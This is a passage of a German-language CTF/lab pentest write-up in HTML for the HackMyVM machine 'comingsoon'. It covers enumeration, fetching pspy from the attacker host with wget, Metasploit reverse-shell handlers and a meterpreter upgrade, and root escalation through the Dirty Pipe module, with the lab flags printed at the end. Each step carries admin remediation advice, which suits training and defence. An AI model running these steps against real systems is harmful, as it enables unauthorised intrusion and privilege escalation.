+                <strong>Empfehlung (Admin):</strong> Korrigieren Sie die Dateiberechtigungen. Stellen Sie sicher, dass sensible Dateien wie `.oldpasswords` nicht existieren oder sicher gespeichert sind. Überprüfen Sie die Berechtigungen im Home-Verzeichnis.
+            </p>
+
+            <!-- Analyse von env und getcap -->
+             <p class="analysis">
+                <strong>Analyse:</strong> Überprüfung der Umgebungsvariablen und Linux Capabilities.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@comingsoon:/home/scpuser$ <span class="command">env</span></div>
+                     <pre>
+SHELL=bash
+LANGUAGE=en_GB:en
+PWD=/home/scpuser
+APACHE_LOG_DIR=/var/log/apache2
+LANG=C
+INVOCATION_ID=eec4d1a08ab74fdba6b0c9daacf43e80
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+TERM=xterm
+APACHE_RUN_GROUP=www-data
+APACHE_LOCK_DIR=/var/lock/apache2
+SHLVL=1
+APACHE_RUN_DIR=/var/run/apache2
+JOURNAL_STREAM=8:11994
+APACHE_RUN_USER=www-data
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+_=/usr/bin/env
+OLDPWD=/home/scpuser/.local
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">www-data@comingsoon:/home/scpuser$ <span class="command">getcap -r / 2>/dev/null</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die Umgebungsvariablen zeigen keine ungewöhnlichen oder direkt ausnutzbaren Informationen. `getcap` findet keine Dateien mit gesetzten Capabilities (außer den Standard-Capabilities für `ping` etc., die hier nicht angezeigt werden), was diesen Eskalationspfad ausschließt.
+             </p>
+            <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Suchen Sie nach Dateien, die dem Benutzer `scpuser` gehören, um dessen Aktivitäten zu verstehen. Laden Sie Prozessüberwachungstools wie `pspy` hoch.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Keine neuen Empfehlungen.
+             </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Suche nach allen Dateien, die dem Benutzer `scpuser` gehören.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@comingsoon:/etc$ <span class="command">find / -user scpuser 2>/dev/null</span></div>
+                     <pre>
+/home/scpuser
+/home/scpuser/.bashrc
+/home/scpuser/.oldpasswords
+/home/scpuser/.ssh
+/home/scpuser/.local
+/home/scpuser/.local/share
+/home/scpuser/.profile
+/home/scpuser/.bash_logout
+/media/flags/user.txt
+                     </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die Suche bestätigt die bereits bekannten Dateien im Home-Verzeichnis und den Symlink `user.txt`. Keine neuen, unerwarteten Dateien wurden gefunden.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Laden Sie `pspy` hoch, um laufende Prozesse und Cron-Jobs zu überwachen. Dies könnte versteckte Aktionen aufdecken.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Keine neuen Empfehlungen.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Das Tool `pspy64` (ein Tool zur Prozessüberwachung ohne Root-Rechte) wird vom Angreifer-System heruntergeladen, ausführbar gemacht und gestartet. Zuerst wird ein Python-HTTP-Server auf dem Angreifer-System gestartet.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">python3 -m http.server</span></div>
+                     <pre>
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@comingsoon:/etc$ <span class="command">cd /tmp/</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt" style="color: yellow;">www-data@comingsoon:/tmp$ <span class="command">wget http://192.168.2.109:8000/pspy64</span></div>
+                     <pre>
+--2022-11-14 12:38:09--  http://192.168.2.109:8000/pspy64
+Connecting to 192.168.2.109:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3078592 (2.9M) [application/octet-stream]
+Saving to: 'pspy64'
+
+pspy64              100%[===================>]   2.94M  --.-KB/s    in 0.02s
+
+2022-11-14 12:38:09 (125 MB/s) - 'pspy64' saved [3078592/3078592]
+                     </pre>
+                     <div class="prompt" style="color: yellow;">www-data@comingsoon:/tmp$ <span class="command">chmod +x pspy64</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> `pspy64` wurde erfolgreich heruntergeladen und vorbereitet.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie `pspy64` aus und beobachten Sie die Ausgabe auf interessante Prozessstarts, insbesondere Cron-Jobs oder Skripte, die mit höheren Rechten laufen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überwachen Sie Downloads aus dem internen Netzwerk. Beschränken Sie die Möglichkeit für Webserver-Benutzer, Tools wie `wget` auszuführen.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `pspy64` wird gestartet und gibt laufende Prozesse sowie neu gestartete Prozesse aus. Die Ausgabe zeigt viele Standard-Systemprozesse (systemd, apache, cron, sshd) und auch die vom Angreifer initiierten Prozesse (`bash`, `sh`, `script`, `pspy64`). Besonders interessant sind die Cron-Job-bezogenen Einträge (`/usr/sbin/CRON -f`) und die PHP-Session-Bereinigung (`/bin/sh -e /usr/lib/php/sessionclean`). Es werden keine sofort offensichtlich ausnutzbaren Cron-Jobs oder ungewöhnlichen Prozesse angezeigt, die direkt zur Eskalation führen. *Hinweis: Die pspy-Ausgabe ist sehr lang; der entscheidende Hinweis könnte übersehen worden sein oder erfordert längere Beobachtung.*
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@comingsoon:/tmp$ <span class="command">./pspy64</span></div>
+                     <pre>
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
+                   ░           ░ ░
+                               ░ ░
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2022/11/14 12:38:24 CMD: UID=0    PID=9      |
+2022/11/14 12:38:24 CMD: UID=33   PID=867    | /usr/sbin/apache2 -k start
+2022/11/14 12:38:24 CMD: UID=33   PID=866    | /usr/sbin/apache2 -k start
+[...]
+2022/11/14 12:39:01 CMD: UID=0    PID=1215   | /usr/sbin/CRON -f
+2022/11/14 12:39:01 CMD: UID=0    PID=1216   | /usr/sbin/CRON -f
+[...]
+2022/11/14 12:39:49 CMD: UID=0    PID=1217   | /sbin/init
+2022/11/14 12:39:49 CMD: UID=0    PID=1221   | /bin/sh -e /usr/lib/php/sessionclean
+2022/11/14 12:39:49 CMD: UID=0    PID=1220   | /bin/sh -e /usr/lib/php/sessionclean
+2022/11/14 12:39:49 CMD: UID=0    PID=1219   | /bin/sh -e /usr/lib/php/sessionclean
+2022/11/14 12:39:49 CMD: UID=0    PID=1218   | /bin/sh -e /usr/lib/php/sessionclean
+2022/11/14 12:39:49 CMD: UID=0    PID=1222   | /bin/sh -e /usr/lib/php/sessionclean
+2022/11/14 12:39:49 CMD: UID=0    PID=1223   | /bin/sh /usr/sbin/phpquery -V
+2022/11/14 12:39:49 CMD: UID=0    PID=1226   | /bin/sh /usr/sbin/phpquery -V
+2022/11/14 12:39:49 CMD: UID=0    PID=1225   | /bin/sh /usr/sbin/phpquery -V
+2022/11/14 12:39:49 CMD: UID=0    PID=1228   | /bin/sh /usr/sbin/phpquery -V
+2022/11/14 12:39:49 CMD: UID=0    PID=1227   | /bin/sh /usr/sbin/phpquery -V
+2022/11/14 12:39:49 CMD: UID=0    PID=1229   | /bin/sh -e /usr/lib/php/sessionclean
+2022/11/14 12:39:49 CMD: UID=0    PID=1230   | /bin/sh -e /usr/lib/php/sessionclean
+2022/11/14 12:39:49 CMD: UID=0    PID=1232   | /bin/sh -e /usr/lib/php/sessionclean
+2022/11/14 12:39:49 CMD: UID=0    PID=1231   | /bin/sh -e /usr/lib/php/sessionclean
+                     </pre> <!-- Stark gekürzte pspy-Ausgabe -->
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die `pspy`-Ausgabe selbst liefert hier keinen klaren Weg. Der nächste Schritt im Logbuch springt jedoch zur Verwendung von Metasploit und dem `local_exploit_suggester`, was darauf hindeutet, dass entweder `pspy` doch einen Hinweis auf einen Kernel-Exploit gab (der hier nicht ersichtlich ist) oder der Pentester sich entschied, bekannte Kernel-Schwachstellen zu prüfen. Der Kernel ist 5.10.0-9-amd64 (Debian 5.10.70-1).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da keine einfachen Vektoren (sudo, SUID, Capabilities) gefunden wurden und die beschreibbaren Systemd-Dateien möglicherweise schwer zu triggern sind, ist die Suche nach Kernel-Exploits ein logischer nächster Schritt. Verwenden Sie Tools wie `linux-exploit-suggester` oder Metasploits `local_exploit_suggester`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Halten Sie den Systemkernel immer aktuell, um bekannte Schwachstellen zu vermeiden. Überwachen Sie das System auf ungewöhnliche Prozessaktivitäten.
+            </p>
+
+             <!-- Analyse von uname -a -->
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@comingsoon:/tmp$ <span class="command">uname -a</span></div>
+                     <pre>
+Linux comingsoon.hmv 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64 GNU/Linux
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Die genaue Kernel-Version wird mit `uname -a` ermittelt. Dies ist wichtig für die Suche nach spezifischen Kernel-Exploits.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Die Kernel-Version 5.10.70 ist bekannt dafür, anfällig für CVE-2022-0847 (Dirty Pipe) zu sein.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie diese Information für die Exploit-Suche, z.B. mit Metasploit.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Patchen Sie den Kernel.
+            </p>
+
+             <!-- Versuch nc -e /bin/bash übersprungen, da fehlgeschlagen und durch Metasploit ersetzt -->
+        </section>
+
+        <section id="proof-of-concept">
+             <h2>Proof of Concept (Privilege Escalation via Dirty Pipe / Metasploit)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Metasploit Framework (`msfconsole`) wird gestartet. Der `exploit/multi/handler` wird konfiguriert, um die zuvor etablierte Netcat-Shell (Session 1) zu empfangen und zu verwalten. `LHOST` wird auf die IP des Angreifers (`eth0` -> 192.168.2.109) und `LPORT` auf 4444 gesetzt. Der Handler wird gestartet.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 > <span class="command">use exploit/multi/handler</span></div>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">options</span></div>
+                     <pre>
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+                    </pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set lhost eth0</span></div>
+                    <pre>lhost => 192.168.2.109</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set lport 4444</span></div>
+                    <pre>lport => 4444</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">run</span></div>
+                     <pre>
+[*] Started reverse TCP handler on 192.168.2.109:4444
+                     </pre>
+                 </div>
+            </div>
+             <!-- Hier wird die Reverse Shell erneut getriggert (Befehl nicht gezeigt) -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Ausgabe des laufenden Handlers -->
+                     <pre>
+[*] Command shell session 1 opened (192.168.2.109:4444 -> 192.168.2.116:39264) at 2022-11-14 13:45:46 +0100
+                     </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die Netcat-Shell wurde erfolgreich in eine Metasploit-Session (Session 1) überführt. Dies erleichtert die weitere Interaktion und das Upgrade zu einer Meterpreter-Session.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie das `shell_to_meterpreter`-Modul, um die einfache Shell in eine funktionsreichere Meterpreter-Session umzuwandeln.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Netzwerkerkennungssysteme (IDS/IPS) können versuchen, Metasploit-Handler-Verbindungen zu erkennen. Egress Filtering kann ausgehende Verbindungen blockieren.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Das Post-Exploitation-Modul `post/multi/manage/shell_to_meterpreter` wird verwendet, um die bestehende Shell-Session (ID 1) in eine Meterpreter-Session umzuwandeln. Es wird ein neuer Listener auf Port 4433 konfiguriert.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">use post/multi/manage/shell_to_meterpreter</span></div>
+                     <!-- 'use 54' wurde ignoriert, da es sich um einen Index handelt -->
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">options</span></div>
+                    <pre>
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to aut
+                                       o detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on
+                    </pre>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set HANDLER true</span></div>
+                    <pre>HANDLER => true</pre>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set lport 4433</span></div>
+                    <pre>lport => 4433</pre>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set session 1</span></div>
+                    <pre>session => 1</pre>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">run</span></div>
+                    <pre>
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 192.168.2.109:4433
+[*] Sending stage (1017704 bytes) to 192.168.2.116
+[*] Meterpreter session 2 opened (192.168.2.109:4433 -> 192.168.2.116:36208) at 2022-11-14 13:46:58 +0100
+[*] Command stager progress: 100.00% (773/773 bytes)
+[*] Post module execution completed
+                    </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Das Upgrade war erfolgreich. Eine neue Meterpreter-Session (Session 2) wurde geöffnet. Meterpreter bietet erweiterte Funktionen zur Interaktion mit dem Zielsystem.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie nun Session 2. Führen Sie den `local_exploit_suggester` in dieser Meterpreter-Session aus, um nach bekannten lokalen Privilegienerweiterungs-Exploits zu suchen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Endpoint Detection and Response (EDR)-Systeme können versuchen, Meterpreter-Payloads und -Aktivitäten zu erkennen.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Das Modul `post/multi/recon/local_exploit_suggester` wird verwendet, um die aktive Meterpreter-Session (Session 2) auf bekannte lokale Schwachstellen zu prüfen, die zur Rechteausweitung genutzt werden könnten.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">search suggester</span></div>
+                     <pre>
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
+
+
+Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
+                     </pre>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">use 0</span></div>
+                    <pre>[*] Using module post/multi/recon/local_exploit_suggester</pre>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">options</span></div>
+                     <pre>
+Module options (post/multi/recon/local_exploit_suggester):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   SESSION                           yes       The session to run this module on
+   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
+                     </pre>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">set session 2</span></div>
+                    <pre>session => 2</pre>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">set SHOWDESCRIPTION false</span></div>
+                    <pre>SHOWDESCRIPTION => false</pre>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">run</span></div>
+                    <pre>
+[*] 192.168.2.116 - Collecting local exploits for x86/linux...
+[*] 192.168.2.116 - 173 exploit checks are being tried...
+[+] 192.168.2.116 - exploit/linux/local/cve_2022_0847_dirtypipe: The target appears to be vulnerable. Linux kernel version found: 5.10.0
+[+] 192.168.2.116 - exploit/linux/local/netfilter_priv_esc_ipv4: The target appears to be vulnerable.
+[+] 192.168.2.116 - exploit/linux/local/su_login: The target appears to be vulnerable.
+[+] 192.168.2.116 - exploit/linux/local/ubuntu_enlightenment_mount_priv_esc: The target appears to be vulnerable.
+[*] Running check method for exploit 52 / 52
+[*] 192.168.2.116 - Valid modules for session 2:
+=================================================
+
+ #   Name                                                               Potentially Vulnerable?  Check Result
+ -   ----                                                               -----------------------  ------------
+ 1   exploit/linux/local/cve_2022_0847_dirtypipe                        Yes                      The target appears to be vulnerable. Linux kernel version found: 5.10.0
+ 2   exploit/linux/local/netfilter_priv_esc_ipv4                        Yes                      The target appears to be vulnerable.
+ 3   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.
+ 4   exploit/linux/local/ubuntu_enlightenment_mount_priv_esc            Yes                      The target appears to be vulnerable.
+
+[*] Post module execution completed
+                    </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Der Suggester hat mehrere potenzielle Exploits gefunden. Der vielversprechendste ist `exploit/linux/local/cve_2022_0847_dirtypipe`, da er auf die spezifische Kernel-Version 5.10.0 abzielt, die mit `uname -a` bestätigt wurde. Dirty Pipe (CVE-2022-0847) war eine weit verbreitete und oft zuverlässige Lücke zur Rechteausweitung.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie das Metasploit-Modul `exploit/linux/local/cve_2022_0847_dirtypipe`, um die Dirty Pipe-Schwachstelle auszunutzen und Root-Rechte zu erlangen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Patchen Sie den Kernel, um CVE-2022-0847 und andere bekannte Schwachstellen zu schließen. Überwachen Sie das System auf Anzeichen von Exploit-Versuchen.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Das Dirty Pipe Exploit-Modul wird ausgewählt und konfiguriert.
+                *   `SESSION`: Wird auf die aktuelle Meterpreter-Session (ID 2) gesetzt.
+                *   `WRITABLE_DIR`: Ein beschreibbares Verzeichnis auf dem Ziel (`/tmp`) wird angegeben.
+                *   `LHOST` und `LPORT`: Werden für die neue Reverse-Shell-Verbindung konfiguriert, die der Exploit öffnen soll (hier zurück auf Port 4444).
+                Der Exploit wird mit `run` gestartet.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">use exploit/linux/local/cve_2022_0847_dirtypipe</span></div>
+                    <pre>[*] Using configured payload linux/x64/meterpreter/reverse_tcp</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">options</span></div>
+                     <pre>
+Module options (exploit/linux/local/cve_2022_0847_dirtypipe):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   COMPILE           Auto             yes       Compile on target (Accepted: Auto, True, False)
+   SESSION                            yes       The session to run this module on
+   SUID_BINARY_PATH  /bin/passwd      no        The path to a suid binary
+   WRITABLE_DIR      /tmp             yes       A directory where we can write files
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+                     </pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">set WRITABLE_DIR /tmp</span></div>
+                    <pre>WRITABLE_DIR => /tmp</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">set session 2</span></div>
+                    <pre>session => 2</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">set lport 4444</span></div>
+                    <pre>lport => 4444</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">set lhost eth0</span></div>
+                    <pre>lhost => 192.168.2.109</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > <span class="command">run</span></div>
+                    <pre>
+[*] Started reverse TCP handler on 192.168.2.109:4444
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Linux kernel version found: 5.10.0
+[*] Writing '/tmp/.dunlgrtjfl' (35592 bytes) ...
+[*] Executing exploit '/tmp/.dunlgrtjfl /bin/passwd'
+[*] Sending stage (3045348 bytes) to 192.168.2.116
+[+] Deleted /tmp/.dunlgrtjfl
+[*] Meterpreter session 3 opened (192.168.2.109:4444 -> 192.168.2.116:39270) at 2022-11-14 13:51:10 +0100
+                    </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> **Privilege Escalation erfolgreich!** Der Dirty Pipe Exploit wurde erfolgreich ausgeführt. Metasploit hat eine temporäre Datei nach `/tmp` geschrieben, den Exploit gestartet (der `/bin/passwd` als Ziel für die Überschreibung verwendet) und eine neue Meterpreter-Session (Session 3) geöffnet, die nun mit Root-Rechten läuft.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Interagieren Sie mit der neuen Meterpreter-Session (Session 3). Wechseln Sie in eine Shell (`shell`-Befehl in Meterpreter) und bestätigen Sie die Root-Identität mit `id`. Lesen Sie die Root-Flag.
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Patchen Sie den Kernel. Überprüfen Sie das System auf Anzeichen der Kompromittierung (z.B. die temporäre Datei im `/tmp`-Verzeichnis, verdächtige Prozesse). Führen Sie eine vollständige Systemprüfung durch.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Innerhalb der neuen Root-Meterpreter-Session (Session 3) wird versucht, `id` und `whoami` auszuführen (diese Befehle funktionieren nicht direkt in Meterpreter). Daraufhin wird mit `shell` eine interaktive System-Shell geöffnet und darin `id` ausgeführt, um die Benutzeridentität zu bestätigen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">meterpreter > <span class="command">id</span></div>
+                    <pre>[-] Unknown command: id</pre>
+                    <div class="prompt metasploit-prompt">meterpreter > <span class="command">whoami</span></div>
+                    <pre>[-] Unknown command: whoami</pre>
+                    <div class="prompt metasploit-prompt">meterpreter > <span class="command">shell</span></div>
+                    <pre>
+Process 1427 created.
+Channel 1 created.
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+                    </pre> <!-- Die normale System-Shell wird hier ohne Prompt angezeigt -->
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Der `id`-Befehl bestätigt, dass die Shell als `root` (UID 0, GID 0) läuft.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Lesen Sie die Root- und User-Flags.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Keine neuen Empfehlungen zur Eskalation selbst, Fokus auf Behebung und Bereinigung.
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                     <div class="flag-command">cat /home/scpuser/user.txt (via Symlink /media/flags/user.txt)</div>
+                     <div class="flag-value"><span class="password">HMV{user:comingsoon.hmv:58842fc1a7}</span></div>
+                </div>
+
+                <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">HMV{root:comingsoon.hmv:2339dc81ca}</span></div>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Innerhalb der Root-Shell werden die Root- und User-Flags gelesen. Die Root-Flag befindet sich in `/root/root.txt`. Die User-Flag wird aus `/home/scpuser/user.txt` gelesen (welches ein Symlink ist).
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Befehle in der Root-Shell -->
+                     <div class="prompt"># <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">HMV{root:comingsoon.hmv:2339dc81ca}</span></pre>
+                     <div class="prompt"># <span class="command">cd /home/</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt"># <span class="command">ls</span></div>
+                     <pre>scpuser</pre>
+                     <div class="prompt"># <span class="command">cd scpuser</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt"># <span class="command">ls</span></div>
+                     <pre>user.txt</pre>
+                     <div class="prompt"># <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">HMV{user:comingsoon.hmv:58842fc1a7}</span></pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Beide Flags wurden erfolgreich gefunden und ausgelesen. Das Ziel der Übung wurde erreicht.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die Flags und schließen Sie den Bericht ab.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Konzentrieren Sie sich auf die Behebung der Schwachstellen: Unsicherer Dateiuploader (gesteuert durch Cookie), Kernel-Schwachstelle (Dirty Pipe).
+            </p>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2022-11-14</p> <!-- Datum aus Nmap/Nikto/Metasploit Logs -->
+    </footer>
+</body>
+</html>
